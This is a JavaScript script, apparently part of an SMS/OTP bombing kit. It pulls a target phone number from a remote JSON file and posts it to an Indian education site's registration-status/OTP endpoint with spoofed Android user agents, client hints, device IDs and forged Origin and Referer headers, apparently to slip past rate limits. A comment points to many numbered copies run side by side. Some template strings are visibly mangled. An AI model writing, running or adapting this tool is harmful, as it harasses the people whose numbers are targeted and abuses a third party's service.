const NUMBER_JSON_URL = 'https://quickmovies.github.io/api/number.json';
const OTP_API_URL = 'https://api.allen-live.in/urm-bff/api/v1/users/check-registration-status';

// =============== Realistic Random Device Generator ===============
function getRandomDevice() {
  const devices = [
    { model: 'Infinix X6871', android: '15', chrome: '131' },
    { model: 'Samsung Galaxy S24', android: '15', chrome: '130' },
    { model: 'Redmi Note 13 Pro', android: '14', chrome: '129' },
    { model: 'POCO X6 Pro', android: '14', chrome: '131' },
    { model: 'Realme GT 6', android: '15', chrome: '130' },
    { model: 'Vivo V30', android: '14', chrome: '128' },
    { model: 'OnePlus Nord 4', android: '15', chrome: '131' },
    { model: 'Motorola Edge 50', android: '14', chrome: '129' },
    { model: 'iQOO Z9', android: '14', chrome: '130' },
    { model: 'Nothing Phone 2a', android: '15', chrome: '131' },
    { model: 'Samsung Galaxy A55', android: '14', chrome: '128' },
    { model: 'Xiaomi 14', android: '15', chrome: '130' },
    { model: 'Oppo Reno 12', android: '14', chrome: '129' },
    { model: 'Tecno Camon 30', android: '14', chrome: '131' },
    { model: 'Infinix Note 40', android: '14', chrome: '130' }
  ];

  const d = devices[Math.floor(Math.random() * devices.length)];
  const build = 'AP3A.' + (240000 + Math.floor(Math.random() * 9000)) + '.015.A2';
  const chromeFull = `\( {d.chrome}.0. \){Math.floor(Math.random()*9000)+1000}.${Math.floor(Math.random()*90)+10}`;

  const ua = `Mozilla/5.0 (Linux; Android ${d.android}; \( {d.model} Build/ \){build}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeFull} Mobile Safari/537.36`;

  return {
    userAgent: ua,
    secChUa: `"Android WebView";v="\( {d.chrome}", "Chromium";v=" \){d.chrome}", "Not(A:Brand";v="24"`,
    platform: '"Android"',
    mobile: '?1',
    deviceId: crypto.randomUUID()
  };
}
// ================================================================

(async function () {
  // Change only this line for each file (v1.js, v2.js, ...)
  const RESULT_KEY = '__result_v1.js';

  const device = getRandomDevice();

  try {
    // 1. Get number
    const res = await fetch(NUMBER_JSON_URL + '?t=' + Date.now());
    const data = await res.json();

    let numbers = [];
    if (Array.isArray(data)) {
      numbers = data.map(item => {
        if (typeof item === 'object' && item !== null) return item.number ?? item;
        return item;
      });
    }

    if (numbers.length === 0) {
      window[RESULT_KEY] = { success: false, message: 'No number found' };
      window.__lastResult = window[RESULT_KEY];
      return;
    }

    const number = String(numbers[0]).trim();

    if (!/^\d{10}$/.test(number)) {
      window[RESULT_KEY] = { success: false, message: 'Invalid number: ' + number };
      window.__lastResult = window[RESULT_KEY];
      return;
    }

    // 2. Send request with random realistic device
    const payload = {
      phone_number: number,
      country_code: "91"
    };

    const otpRes = await fetch(OTP_API_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'Origin': 'https://allen.in',
        'Referer': 'https://allen.in/',
        'User-Agent': device.userAgent,
        'sec-ch-ua': device.secChUa,
        'sec-ch-ua-platform': device.platform,
        'sec-ch-ua-mobile': device.mobile,
        'x-device-id': device.deviceId,
        'x-client-type': 'mweb',
        'x-requested-with': 'mark.via.gp'
      },
      body: JSON.stringify(payload)
    });

    const text = await otpRes.text();
    let result;
    try {
      result = JSON.parse(text);
    } catch {
      result = { raw: text };
    }

    if (otpRes.ok) {
      window[RESULT_KEY] = {
        success: true,
        message: `Request sent for ${number}`,
        data: result
      };
    } else {
      window[RESULT_KEY] = {
        success: false,
        message: `HTTP ${otpRes.status}`,
        data: result
      };
    }

    window.__lastResult = window[RESULT_KEY];

  } catch (err) {
    window[RESULT_KEY] = {
      success: false,
      message: err.message
    };
    window.__lastResult = window[RESULT_KEY];
  }
})();
